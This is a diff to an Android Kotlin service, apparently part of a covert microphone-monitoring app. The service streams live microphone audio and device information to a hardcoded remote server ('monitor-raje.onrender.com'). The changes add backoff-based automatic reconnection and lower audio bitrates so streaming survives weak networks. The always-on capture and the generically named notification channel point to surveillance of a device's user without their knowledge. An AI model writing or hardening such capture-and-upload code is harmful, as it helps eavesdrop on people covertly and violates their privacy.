@@ -43,6 +43,7 @@ import java.util.UUID
 import java.util.concurrent.TimeUnit
 import kotlin.math.max
 import kotlin.math.min
+import kotlin.random.Random
 import org.json.JSONObject
 import org.json.JSONArray
 import org.webrtc.AudioSource
@@ -90,6 +91,8 @@ class MicService : Service() {
     // ── WebSocket ────────────────────────────────────────────────────────────
     private var webSocket: WebSocket? = null
     @Volatile private var isWsConnecting = false
+    private var wsReconnectJob: Job? = null
+    @Volatile private var wsReconnectAttempts = 0
     private val okHttpClient = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
         .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
@@ -175,9 +178,11 @@ class MicService : Service() {
         const val CHANNEL_ID   = "device_services_channel"
         const val NOTIF_ID     = 101
         const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
-        const val WEBRTC_MIN_BITRATE_KBPS = 24
-        const val WEBRTC_MID_BITRATE_KBPS = 40
-        const val WEBRTC_MAX_BITRATE_KBPS = 64
+        const val WEBRTC_MIN_BITRATE_KBPS = 16
+        const val WEBRTC_MID_BITRATE_KBPS = 24
+        const val WEBRTC_MAX_BITRATE_KBPS = 40
+        const val WS_RECONNECT_BASE_MS = 2_000L
+        const val WS_RECONNECT_MAX_MS = 30_000L
 
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
@@ -282,6 +287,8 @@ class MicService : Service() {
         isSavingFile = false
         activeWebSocket = null
         serviceScope.cancel()
+        wsReconnectJob?.cancel()
+        wsReconnectJob = null
         stopMicWatchdog()
         stopAudioCapture("stop_capture_for_webrtc")
         stopWebRtcSession(notifyState = false)
@@ -329,6 +336,9 @@ class MicService : Service() {
                 Log.i(TAG, "WebSocket connected ✅")
                 isWsConnecting = false
                 activeWebSocket = webSocket
+                wsReconnectAttempts = 0
+                wsReconnectJob?.cancel()
+                wsReconnectJob = null
                 updateNotification("Live streaming active")
                 webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
                 // Mic-first mode: always keep capture active when connected.
@@ -349,34 +359,57 @@ class MicService : Service() {
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 Log.e(TAG, "WebSocket failure: ${t.message}")
-                isWsConnecting = false
-                activeWebSocket = null
-                updateNotification("Disconnected — retrying in 5s…")
-                stopMicWatchdog()
-                stopAudioCapture()
-                stopWebRtcSession(notifyState = false)
-                stopDataCollection()
-                serviceScope.launch {
-                    delay(5_000)
-                    connectWebSocket()
-                }
+                onWsDisconnected("failure")
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 Log.w(TAG, "WebSocket closed: $reason")
-                isWsConnecting = false
-                activeWebSocket = null
-                updateNotification("Disconnected — retrying…")
-                stopMicWatchdog()
-                stopAudioCapture()
-                stopWebRtcSession(notifyState = false)
-                stopDataCollection()
-                serviceScope.launch {
-                    delay(5_000)
-                    connectWebSocket()
-                }
+                onWsDisconnected("closed")
             }
         })
+    }
+
+    private fun onWsDisconnected(reason: String) {
+        isWsConnecting = false
+        activeWebSocket = null
+        stopMicWatchdog()
+        stopAudioCapture()
+        stopWebRtcSession(notifyState = false)
+        stopDataCollection()
+        scheduleWebSocketReconnect(reason)
+    }
+
+    private fun isNetworkUsable(): Boolean {
+        val cm = connectivityManager ?: return true
+        val network = cm.activeNetwork ?: return false
+        val caps = cm.getNetworkCapabilities(network) ?: return false
+        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+    }
+
+    private fun nextReconnectDelayMs(): Long {
+        val expShift = wsReconnectAttempts.coerceAtMost(4)
+        val expDelay = (WS_RECONNECT_BASE_MS * (1L shl expShift)).coerceAtMost(WS_RECONNECT_MAX_MS)
+        val jitter = Random.nextLong(250L, 1_500L)
+        return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
+    }
+
+    private fun scheduleWebSocketReconnect(reason: String) {
+        if (wsReconnectJob?.isActive == true) return
+        wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive && activeWebSocket == null && !isWsConnecting) {
+                if (!isNetworkUsable()) {
+                    updateNotification("Offline — waiting for network…")
+                    delay(4_000)
+                    continue
+                }
+                val delayMs = nextReconnectDelayMs()
+                updateNotification("Disconnected ($reason) — reconnecting in ${delayMs / 1000}s…")
+                delay(delayMs)
+                if (activeWebSocket != null || isWsConnecting) break
+                wsReconnectAttempts = (wsReconnectAttempts + 1).coerceAtMost(20)
+                connectWebSocket()
+            }
+        }
     }
 
     // ────────────────────────────────────────────────────────────────────────
@@ -703,18 +736,18 @@ class MicService : Service() {
             ?.groupValues
             ?.getOrNull(1)
             ?: return sdp
-        val maxAvg = (targetKbps * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, 64_000)
+        val maxAvg = (targetKbps * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, WEBRTC_MAX_BITRATE_KBPS * 1000)
         val minAvg = (WEBRTC_MIN_BITRATE_KBPS * 1000).coerceAtMost(maxAvg)
         val fmtpRegex = Regex("a=fmtp:$opusPayload ([^\\r\\n]+)")
         val tunedParams = mapOf(
             "maxaveragebitrate" to maxAvg.toString(),
             "minaveragebitrate" to minAvg.toString(),
-            "maxplaybackrate" to "48000",
-            "sprop-maxcapturerate" to "48000",
+            "maxplaybackrate" to "16000",
+            "sprop-maxcapturerate" to "16000",
             "ptime" to "20",
             "minptime" to "10",
             "useinbandfec" to "1",           // FEC: recovers lost packets on low network
-            "usedtx" to "0",                // avoid silence gating artifacts on far speech
+            "usedtx" to "1",                // save bandwidth on silence in weak networks
             "stereo" to "0",
             "sprop-stereo" to "0",
             "cbr" to "0",                    // VBR: allocates more bits to complex speech
@@ -830,9 +863,9 @@ class MicService : Service() {
         if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
             val downKbps = caps.linkDownstreamBandwidthKbps
             target = when {
-                downKbps in 1..1200 -> WEBRTC_MIN_BITRATE_KBPS
-                downKbps in 1201..5000 -> WEBRTC_MID_BITRATE_KBPS
-                downKbps in 5001..12000 -> 24
+                downKbps in 1..900 -> WEBRTC_MIN_BITRATE_KBPS
+                downKbps in 901..3000 -> WEBRTC_MID_BITRATE_KBPS
+                downKbps in 3001..9000 -> 32
                 else -> WEBRTC_MAX_BITRATE_KBPS
             }
         }
@@ -840,6 +873,7 @@ class MicService : Service() {
         val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
         val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
         val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
+        if (wsReconnectAttempts >= 4) return WEBRTC_MIN_BITRATE_KBPS
         if (!loss.isNaN() && loss >= 10.0) return WEBRTC_MIN_BITRATE_KBPS
         if (!rtt.isNaN() && rtt >= 450.0) return WEBRTC_MIN_BITRATE_KBPS
         if (!jitter.isNaN() && jitter >= 120.0) return WEBRTC_MIN_BITRATE_KBPS
